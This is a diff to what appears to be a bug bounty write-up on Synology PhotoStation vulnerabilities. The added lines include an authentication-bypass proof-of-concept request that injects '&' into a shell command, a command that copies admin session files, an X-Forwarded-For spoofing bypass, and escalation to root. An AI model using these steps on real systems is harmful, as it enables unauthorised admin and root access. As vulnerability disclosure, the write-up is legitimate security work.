@@ -1,3 +1,4 @@
+---
 title: '[Synology Bug Bounty 2016]'
 author: BambooFox
 tags:
@@ -60,6 +61,22 @@ The command will return 0 (True) and thus bypass the authentication.
 Adversary can login as admin without password**
 
 ![Login without password](http://i.imgur.com/pnIWZ6t.png)
+
+Adversary can also login as admin by the following PoC:
+
+```
+GET /photo/photo_login.php
+action=login&username=admin&password=%26
+```
+
+The source code that handle the user authentication are in `photo_login.php`:
+
+```php
+$retval = csSYNOPhotoMisc::ExecCmd('/usr/syno/bin/synophoto_dsm_user', array('--auth', $user, $pass), false, $result);
+```
+
+Once the `$pass` variable is `&`, the command will be executed in the background and always return 0 (true), thus the adversary can login as admin.
+
 
 ## Vul-02: PhotoStation Remote Code Execution
 ---
@@ -126,6 +143,18 @@ With the previous Vul-03, we can exploit the vulnerability and **escalate our pr
 
 Now we can wait for our reverse shell, with the root permission.
 ![Remote Code Execution](http://i.imgur.com/5YrQU54.jpg)
+
+
+Also by exploiting Vul-02 ( RCE ) and Vul-03 ( Read-Write Arbitrary Files ), we're able to login the service as as admin. If the admin is logged in, we can use the following command to get the admin's session ID:
+
+```
+usr/syno/bin/synophoto_dsm_user --copy root /usr/syno/etc/private/session/current.users /volume1/photo/current.users
+```
+
+Although the server side will check the admin's IP address, but the check can be bypassed easily by forging the `X-Forwarded-For` header.
+
+**Login as admin give us the ability to execute command with the root permission**. For example, we can execute our own command as root with the help of **Task Scheduler**. This result in a privilege escalation as well.
+
 
 ## Vul-05: DoS via Blocking IP
 ---
